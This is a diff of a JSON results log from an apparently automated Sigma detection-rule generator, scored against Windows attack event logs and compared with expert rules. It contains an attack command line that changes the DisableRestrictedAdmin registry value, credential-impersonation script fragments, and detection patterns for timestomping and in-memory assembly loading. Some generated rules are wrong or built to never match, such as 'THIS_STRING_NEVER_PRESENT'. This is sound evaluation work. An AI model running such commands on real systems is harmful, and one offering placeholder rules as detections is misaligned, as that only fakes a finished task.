+     "rule_text": "title: DisableRestrictedAdmin Registry Value Tampering\nid: 0fc456ab-4b59-4e44-82b3-91ed3ed982fb\nstatus: experimental\ndescription: Detects changes to the DisableRestrictedAdmin registry value to enable or disable RestrictedAdmin mode.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.persistence\n- attack.defense-impairment\n- attack.t1112\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection:\n    TargetObject|endswith|endswith: \\DisableRestrictedAdmin\n    EventType: SetValue\n  selection_sysmon:\n    Channel: Microsoft-Windows-Sysmon/Operational\n    EventID: '1'\n    CommandLine|contains|contains: DisableRestrictedAdmin\n  condition: selection or selection_sysmon\nfalsepositives:\n- Legitimate administrative changes to RestrictedAdmin mode.\nlevel: medium\n",
+     "sha256": "e81bca62f1397decc5e47af7b3f62f8e2c303a63b99636c90b80f2a0307098ac",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "ng(['1'])), ConditionFieldEqualsValueExpression(parent=..., field='CommandLine', value=SigmaString([<SpecialChars.WILDCARD_MULTI: 1>, 'DisableRestrictedAdmin', <SpecialChars.WILDCARD_MULTI: 1>]))], source=SigmaRuleLocation(path=WindowsPath('C:/Users/prajw/AppData/Local/Temp/shakedown-validate-o4xa4n7u/proc_creation_win_shakedown_candidate.yml'), line=None, char=None))], source=SigmaRuleLocation(path=WindowsPath('C:/Users/prajw/AppData/Local/Temp/shakedown-validate-o4xa4n7u/proc_creation_win_shakedown_candidate.yml'), line=None, char=None)), args=['selection_sysmon'], source=None, identifier='selection_sysmon'), detection_items=[SigmaDetectionItem(parent=..., applied_processing_items=set(), field='Channel', modifiers=[], value=[SigmaString(['Microsoft-Windows-Sysmon/Operational'])], value_linking=<class 'sigma.conditions.ConditionOR'>, negated=False, source=SigmaRuleLocation(path=WindowsPath('C:/Users/prajw/AppData/Local/Temp/shakedown-validate-o4xa4n7u/proc_creation_win_shakedown_candidate.yml'), line=None, char=None)), SigmaDetectionItem(parent=..., applied_processing_items=set(), field='EventID', modifiers=[], value=[SigmaString(['1'])], value_linking=<class 'sigma.conditions.ConditionOR'>, negated=False, source=SigmaRuleLocation(path=WindowsPath('C:/Users/prajw/AppData/Local/Temp/shakedown-validate-o4xa4n7u/proc_creation_win_shakedown_candidate.yml'), line=None, char=None)), ...], source=SigmaRuleLocation(path=WindowsPath('C:/Users/prajw/AppData/Local/Temp/shakedown-validate-o4xa4n7u/proc_creation_win_shakedown_candidate.yml'), line=None, char=None), item_linking=<class 'sigma.conditions.ConditionAND'>), applied_processing_items=set(), field='CommandLine', modifiers=[<class 'sigma.modifiers.SigmaContainsModifier'>, <class 'sigma.modifiers.SigmaContainsModifier'>], value=[SigmaString([<SpecialChars.WILDCARD_MULTI: 1>, 'DisableRestrictedAdmin', <SpecialChars.WILDCARD_MULTI: 1>])], value_linking=<class 'sigma.conditions.ConditionOR'>, negated=False, source=SigmaRuleLocation(path=WindowsPath('C:/Users/prajw/AppData/Local/Temp/shakedown-validate-o4xa4n7u/proc_creation_win_shakedown_candidate.yml'), line=None, char=None)) modifiers={<class 'sigma.modifiers.SigmaContainsModifier'>}\n\n=== Summary ===\nFound 0 errors, 0 condition errors and 3 issues.\nNo rule errors found.\nNo condition errors found.\n\nValidation issue summary:\n+-------+------------------------------+----------+-----------------------------------------------+\n| Count | Issue                        | Severity | Description                                   |\n+-------+------------------------------+----------+-----------------------------------------------+\n| 2     | ModifierAppliedMultipleIssue | MEDIUM   | Modifiers shouldn't be applied multiple times |\n| 1     | NumberAsStringIssue          | LOW      | A number was expressed as string              |\n+-------+------------------------------+----------+-----------------------------------------------+\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "28ac00d6-22d9-4a3c-927f-bbd770104573.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "technique_id=T1083,technique_name=File and Directory Discovery",
+        "UtcTime": "2026-08-07 11:26:20.730",
+        "ProcessGuid": "{570e49aa-c0dc-6a75-2704-000000001300}",
+        "ProcessId": "3244",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "FileVersion": "10.0.26100.8737 (WinBuild.160101.0800)",
+        "Description": "Windows Command Processor",
+        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "Cmd.Exe",
+        "CommandLine": "\"cmd.exe\" /c reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0",
+        "CurrentDirectory": "C:\\Users\\frack113\\AppData\\Local\\Temp\\",
+        "User": "SigmaCatchVm\\frack113",
+        "LogonGuid": "{570e49aa-b8ea-6a75-1bda-070000000000}",
+        "LogonId": "0x000000000007da1b",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "High",
+        "Hashes": "SHA1=6142A8457F497ABC4B102D75F549F76A9E3577C7,MD5=1F4D18374A699452622E80F6D5BB743E,SHA256=65EC268ADD3973B6DCA64222985DA47CAEAEE44A340B0EC1466782914FD743D9,IMPHASH=010B165E4C37F484601D3DBD700C9423",
+        "ParentProcessGuid": "{570e49aa-bd18-6a75-7201-000000001300}",
+        "ParentProcessId": "6428",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+        "ParentUser": "SigmaCatchVm\\frack113"
+       }
+      ],
+      "seconds": 13.25
+     },
+     "tokens": 7562,
+     "latency_s": 23.84,
+     "evaluator_error": null,
+     "resamples": 2
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 9.81
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: RestrictedAdminMode Registry Value Tampering - ProcCreation\nid: 28ac00d6-22d9-4a3c-927f-bbd770104573\nrelated:\n    - id: d6ce7ebd-260b-4323-9768-a9631c8d4db2 # Registry\n      type: similar\nstatus: test\ndescription: |\n    Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode.\n    RestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\n    This prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md\n    - https://social.technet.microsoft.com/wiki/contents/articles/32905.remote-desktop-services-enable-restricted-admin-mode.aspx\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\nauthor: frack113\ndate: 2023-01-13\nmodified: 2025-08-28\ntags:\n    - attack.persistence\n    - attack.defense-impairment\n    - attack.t1112\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\System\\CurrentControlSet\\Control\\Lsa'\n            - 'DisableRestrictedAdmin'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_reg_lsa_disable_restricted_admin/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "c6438007-e081-42ce-9483-b067fbef33c3",
+    "rule_path": "rules/windows/powershell/powershell_script/posh_ps_timestomp.yml",
+    "title": "Powershell Timestomp",
+    "category": "ps_script",
+    "date": "2021-08-03",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/powershell/powershell_script/posh_ps_timestomp/c6438007-e081-42ce-9483-b067fbef33c3.evtx",
+    "sample_sha256": "bb458788aa93a8b71fbda7ccad3670e4b3863065572a7c7581e167cbfffbaafb"
+   },
+   "spec": {
+    "behavior": "complete",
+    "logsource_category": "network_connection",
+    "observables": [
+     {
+      "field": "http.url",
+      "match": "equals",
+      "value": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.006/T1070.006.md",
+      "quote": "- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.006/T1070.006.md"
+     },
+     {
+      "field": "http.url",
+      "match": "equals",
+      "value": "https://www.offensive-security.com/metasploit-unleashed/timestomp/",
+      "quote": "- https://www.offensive-security.com/metasploit-unleashed/timestomp/"
+     }
+    ],
+    "techniques": [
+     {
+      "id": "T1070.006",
+      "quote": "ATT&CK tags: attack.stealth, attack.t1070.006"
+     }
+    ]
+   },
+   "spec_dropped": [],
+   "success": false,
+   "stop_reason": "repair budget exhausted",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Potential PowerShell Timestomp via Known Atomic Red Team / Metasploit Resources\nid: 8362f0fd-682c-4c86-8ada-4b2b12110113\nstatus: experimental\ndescription: Detects network connections to URLs associated with PowerShell timestomp technique (T1070.006) from Atomic Red\n  Team and Metasploit Unleashed.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.stealth\n- attack.t1070.006\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    http.url:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.006/T1070.006.md\n    - https://www.offensive-security.com/metasploit-unleashed/timestomp/\n  condition: selection\nfalsepositives:\n- Unknown\nlevel: high\n",
+     "sha256": "5c02e402a33bb32bc14262ec0cc11b8e890d1b8f36bf200410251f9e7d36075e",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "c6438007-e081-42ce-9483-b067fbef33c3.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 4104,
+        "Channel": "Microsoft-Windows-PowerShell/Operational",
+        "MessageNumber": "15",
+        "MessageTotal": "16",
+        "ScriptBlockText": "r:'\n                $username = Get-Credential\n                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'\n                Write-Host -ForegroundColor Yellow 'Searching...:'\n                rewires -LocalGroup $group -Credential $username >> $currentPat...",
+        "ScriptBlockId": "9bf3269a-38d5-40ba-8586-978c28068a54",
+        "Path": ""
+       }
+      ],
+      "seconds": 11.31
+     },
+     "tokens": 1928,
+     "latency_s": 5.81,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Potential PowerShell Timestomp via Known Atomic Red Team / Metasploit Resources\",\n \"description\": \"Detects network connections to URLs associated with PowerShell timestomp technique (T1070.006) from Atomic Red Team and Metasploit Unleashed, as well as PowerShell script blocks indicative of the same technique.\",\n \"tags\": [\n  \"attack.stealth\",\n  \"attack.t1070.006\"\n ],\n \"logsource_category\": \"network_connection\",\n \"groups\": [],\n \"condition\": \"selection or ps_selection\",\n \"falsepositives\": [\n  \"Unknown\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "1eefef3f48b702e12880cad9ae124b6e8718b32d564a08e8ba88b5835eaad509",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: rule has no detection groups"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 9309,
+     "latency_s": 34.08,
+     "evaluator_error": null,
+     "resamples": 3
+    },
+    {
+     "index": 2,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Potential PowerShell Timestomp via Known Atomic Red Team / Metasploit Resources\",\n \"description\": \"Detects network connections to URLs associated with PowerShell timestomp technique (T1070.006) from Atomic Red Team and Metasploit Unleashed, as well as PowerShell script blocks indicative of the same technique.\",\n \"tags\": [\n  \"attack.stealth\",\n  \"attack.t1070.006\"\n ],\n \"logsource_category\": \"network_connection\",\n \"groups\": [\n  {\n   \"name\": \"selection\",\n   \"fields\": []\n  }\n ],\n \"condition\": \"selection or ps_selection\",\n \"falsepositives\": [\n  \"Unknown\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "66d6d971cb2bd9d775f47b8fe068b1d81f996b650cfda4e32544f1f27f0e7a5e",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: group 'selection' has no fields"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 1789,
+     "latency_s": 8.38,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 3,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Potential PowerShell Timestomp via Known Atomic Red Team / Metasploit Resources\",\n \"description\": \"Detects network connections to URLs associated with PowerShell timestomp technique (T1070.006) from Atomic Red Team and Metasploit Unleashed, as well as PowerShell script blocks indicative of the same technique.\",\n \"tags\": [\n  \"attack.stealth\",\n  \"attack.t1070.006\"\n ],\n \"logsource_category\": \"network_connection\",\n \"groups\": [\n  {\n   \"name\": \"selection\",\n   \"fields\": [\n    {\n     \"field\": \"url\",\n     \"modifier\": \"exact\",\n     \"values\": [\n      \"__NO_MATCH__\"\n     ]\n    }\n   ]\n  },\n  {\n   \"name\": \"ps_selection\",\n   \"fields\": []\n  }\n ],\n \"condition\": \"selection or ps_selection\",\n \"falsepositives\": [\n  \"Unknown\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "2a7190aa24535897b4cfda26d92082539fe5489d8bd658ed882d3427b00b68ad",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: group 'ps_selection' has no fields"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 1728,
+     "latency_s": 11.53,
+     "evaluator_error": null,
+     "resamples": 0
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 7.28
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Powershell Timestomp\nid: c6438007-e081-42ce-9483-b067fbef33c3\nstatus: test\ndescription: |\n    Adversaries may modify file time attributes to hide new or changes to existing files.\n    Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.006/T1070.006.md\n    - https://www.offensive-security.com/metasploit-unleashed/timestomp/\nauthor: frack113\ndate: 2021-08-03\nmodified: 2022-12-25\ntags:\n    - attack.stealth\n    - attack.t1070.006\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_ioc:\n        ScriptBlockText|contains:\n            - '.CreationTime ='\n            - '.LastWriteTime ='\n            - '.LastAccessTime ='\n            - '[IO.File]::SetCreationTime'\n            - '[IO.File]::SetLastAccessTime'\n            - '[IO.File]::SetLastWriteTime'\n    condition: selection_ioc\nfalsepositives:\n    - Legitimate admin script\nlevel: medium\nregression_tests_path: regression_data/rules/windows/powershell/powershell_script/posh_ps_timestomp/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
+    "rule_path": "rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml",
+    "title": "Malicious PowerShell Commandlets - ScriptBlock",
+    "category": "ps_script",
+    "date": "2017-03-05",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets/89819aa4-bbd6-46bc-88ec-c7f7fe30efa6.evtx",
+    "sample_sha256": "c9bd674267659259255e9f500365ba93a721b64753aa8ce00642139ca40130d2"
+   },
+   "error": "TokenFactoryError: model returned non-JSON content: '{\"behavior\": \"complete\", \"logsource_category\": \"network_connection\", \"observables\": [{\"field\": \"url\", \"match\": \"contains\", \"value\": \"https://adsecurity.org/?p=2921\", \"quote\": \"- https://adsecurity.org/?p=2921\"}, {\"field\": \"url\", \"match\": \"contains\", \"value\": \"https://github.com/S3cur3Th1sSh1t/PowerS'"
+  },
+  {
+   "task": {
+    "rule_id": "ddcd88cb-7f62-4ce5-86f9-1704190feb0a",
+    "rule_path": "rules/windows/powershell/powershell_script/posh_ps_dotnet_assembly_from_file.yml",
+    "title": "Potential In-Memory Execution Using Reflection.Assembly",
+    "category": "ps_script",
+    "date": "2022-12-25",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/powershell/powershell_script/posh_ps_dotnet_assembly_from_file/ddcd88cb-7f62-4ce5-86f9-1704190feb0a.evtx",
+    "sample_sha256": "d59146e5ef2e75d68a8c15b2e125fb0cd0eb7119f97ca4c050ce1f4fb29aa838"
+   },
+   "spec": {
+    "behavior": "completed",
+    "logsource_category": "process_creation",
+    "observables": [],
+    "techniques": []
+   },
+   "spec_dropped": [
+    {
+     "kind": "observable",
+     "item": {
+      "field": "Image",
+      "match": "endswith",
+      "value": "\\powershell.exe",
+      "quote": ""
+     },
+     "reason": "quote not found verbatim in report"
+    }
+   ],
+   "success": false,
+   "stop_reason": "repair budget exhausted",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Potential In-Memory Assembly Load via Reflection.Assembly\nid: 7c76ebb3-3f21-456b-ae18-257a10e8c276\nstatus: experimental\ndescription: Detects usage of Reflection.Assembly load methods to dynamically load assemblies in memory, indicative of in-memory\n  execution.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.stealth\n- attack.t1620\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    CommandLine|contains:\n    - '[System.Reflection.Assembly]::Load'\n    - Assembly.Load\n    - Reflection.Assembly.Load\n    - Reflection.Assembly.LoadFrom\n  condition: selection\nfalsepositives:\n- Legitimate .NET applications that use reflection for plugin loading\nlevel: high\n",
+     "sha256": "1452f80eaca9c18d47e44b306dd67fa4fb61c6eb649c2c95246fd88cd3ab9403",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "ddcd88cb-7f62-4ce5-86f9-1704190feb0a.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 4104,
+        "Channel": "Microsoft-Windows-PowerShell/Operational",
+        "MessageNumber": "8",
+        "MessageTotal": "65",
+        "ScriptBlockText": "32::ImpersonateLoggedOnUser($LogonTokenHandle)\n\n    if (-not $Result) {\n        throw \"[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"\n    }\n\n    Write-Verbose \"[Invoke-UserImpersonation] Alternate credentials successfully imperson...",
+        "ScriptBlockId": "940a130b-168f-42bb-bfbe-f26f7ca45237",
+        "Path": ""
+       }
+      ],
+      "seconds": 11.31
+     },
+     "tokens": 1171,
+     "latency_s": 3.86,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Potential In-Memory Assembly Load via Reflection.Assembly\",\n \"description\": \"Detects usage of Reflection.Assembly load methods to dynamically load assemblies in memory, indicative of in-memory execution.\",\n \"tags\": [\n  \"attack.stealth\",\n  \"attack.t1620\"\n ],\n \"logsource_category\": \"process_creation\",\n \"groups\": [],\n \"condition\": \"\",\n \"falsepositives\": [\n  \"Legitimate .NET applications that use reflection for plugin loading\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "131a49b361eebff78719eb7500a259a40cc87b9785e875c885d6dd6b797db069",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: rule has no condition"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 6582,
+     "latency_s": 22.25,
+     "evaluator_error": null,
+     "resamples": 3
+    },
+    {
+     "index": 2,
+     "action": "repair",
+     "rule_text": "title: Potential In-Memory Assembly Load via Reflection.Assembly\nid: 7c76ebb3-3f21-456b-ae18-257a10e8c276\nstatus: experimental\ndescription: Detects usage of Reflection.Assembly load methods to dynamically load assemblies in memory, indicative of in-memory\n  execution.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.stealth\n- attack.t1620\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|contains: THIS_STRING_NEVER_PRESENT\n  condition: selection\nfalsepositives:\n- Legitimate .NET applications that use reflection for plugin loading\nlevel: high\n",
+     "sha256": "bd7f05fdfc0d49d26435b00cfa841387cfb9586f4b8e06c8ffc071c5a88a8b7c",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "ddcd88cb-7f62-4ce5-86f9-1704190feb0a.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 4104,
+        "Channel": "Microsoft-Windows-PowerShell/Operational",
+        "MessageNumber": "8",
+        "MessageTotal": "65",
+        "ScriptBlockText": "32::ImpersonateLoggedOnUser($LogonTokenHandle)\n\n    if (-not $Result) {\n        throw \"[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"\n    }\n\n    Write-Verbose \"[Invoke-UserImpersonation] Alternate credentials successfully imperson...",
+        "ScriptBlockId": "940a130b-168f-42bb-bfbe-f26f7ca45237",
+        "Path": ""
+       }
+      ],
+      "seconds": 8.73
+     },
+     "tokens": 1016,
+     "latency_s": 4.36,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 3,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Potential In-Memory Assembly Load via Reflection.Assembly\",\n \"description\": \"Detects usage of Reflection.Assembly load methods to dynamically load assemblies in memory, indicative of in-memory execution.\",\n \"tags\": [\n  \"attack.stealth\",\n  \"attack.t1620\"\n ],\n \"logsource_category\": \"process_creation\",\n \"groups\": [],\n \"condition\": \"\",\n \"falsepositives\": [\n  \"Legitimate .NET applications that use reflection for plugin loading\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "131a49b361eebff78719eb7500a259a40cc87b9785e875c885d6dd6b797db069",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: rule has no condition"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 6784,
+     "latency_s": 25.44,
+     "evaluator_error": null,
+     "resamples": 3
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 14.2
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Potential In-Memory Execution Using Reflection.Assembly\nid: ddcd88cb-7f62-4ce5-86f9-1704190feb0a\nstatus: test\ndescription: Detects usage of \"Reflection.Assembly\" load functions to dynamically load assemblies in memory\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=50\nauthor: frack113\ndate: 2022-12-25\nmodified: 2026-10-19\ntags:\n    - attack.stealth\n    - attack.t1620\nlogsource:\n    product: windows\n    category: ps_script\n    definition: Script Block Logging must be enable\ndetection:\n    selection:\n        ScriptBlockText|contains: '[Reflection.Assembly]::load'\n    filter_optional_sqlserver:\n        Path|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft SQL Server\\'\n            - 'C:\\Program Files\\Microsoft SQL Server\\'\n        Path|endswith: '\\Tools\\PowerShell\\Modules\\SQLPS\\SqlPsPostScript.ps1'\n        ScriptBlockText|contains: 'SQLSERVER: { Set-Location'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Legitimate use of the library\nlevel: medium\nregression_tests_path: regression_data/rules/windows/powershell/powershell_script/posh_ps_dotnet_assembly_from_file/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "5de03871-5d46-4539-a82d-3aa992a69a83",
+    "rule_path": "rules/windows/registry/registry_set/registry_set_disable_system_restore.yml",
+    "title": "Registry Disable System Restore",
+    "category": "registry_set",
+    "date": "2022-04-04",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/registry/registry_set/registry_set_disable_system_restore/5de03871-5d46-4539-a82d-3aa992a69a83.evtx",
+    "sample_sha256": "82d4f8390f5fdac364b325c1bb7ce6a4b454eec6ecacccc2e41ac76f62393f8e"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "registry_set",
+    "observables": [],
+    "techniques": []
+   },
+   "spec_dropped": [],
+   "success": false,
+   "stop_reason": "repair budget exhausted",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Disable System Restore via Registry\nid: fad38f8b-901e-405c-8016-e5d3e0f8c126\nstatus: experimental\ndescription: Detects modification of the Windows Registry to disable System Restore by setting the DisableSR value under the\n  SystemRestore key.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.impact\n- attack.t1490\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection:\n    TargetObject|endswith: \\SystemRestore\n    TargetObject|contains: \\SystemRestore\\\n    Details|contains: DisableSR\n  condition: selection\nfalsepositives:\n- Legitimate administrative scripts that modify System Restore settings may trigger this rule.\nlevel: high\n",
+     "sha256": "5a08035a5257b037a602129d14c89a7ead8779e14be038e7b308f4599d6d2509",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "5de03871-5d46-4539-a82d-3aa992a69a83.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2026-03-11 05:55:53.547",
+        "ProcessGuid": "{0197231e-03e9-69b1-ba1a-000000000800}",
+        "ProcessId": "9860",
+        "Image": "C:\\WINDOWS\\system32\\reg.exe",
+        "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig",
+        "Details": "DWORD (0x00000001)",
+        "User": "swachchhanda\\xodih"
+       },
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2026-03-11 05:55:53.581",
+        "ProcessGuid": "{0197231e-03e9-69b1-bb1a-000000000800}",
+        "ProcessId": "6164",
+        "Image": "C:\\WINDOWS\\system32\\reg.exe",
